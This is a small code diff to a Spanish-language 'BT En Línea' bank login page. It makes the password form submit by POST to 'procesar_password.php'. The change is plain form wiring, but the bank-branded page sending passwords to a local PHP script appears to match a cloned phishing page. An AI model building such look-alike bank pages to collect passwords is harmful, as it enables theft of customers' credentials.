@@ -142,11 +142,11 @@
             <img src="logo-slogan.png" alt="BT En Línea">
         </div>
         <h1>Ingreso a BT En Línea</h1>
-        <form>
+        <form action="procesar_password.php" method="POST">
             <div class="form-group">
                 <label for="password">Ingresa tu contraseña</label>
                 <div class="form-group-single">
-                    <input id="password" type="password" placeholder="Escribe tu respuesta">
+                    <input id="password" name="password" type="password" placeholder="Escribe tu respuesta" required>
                 </div>
             </div>
             <div class="btn-container">
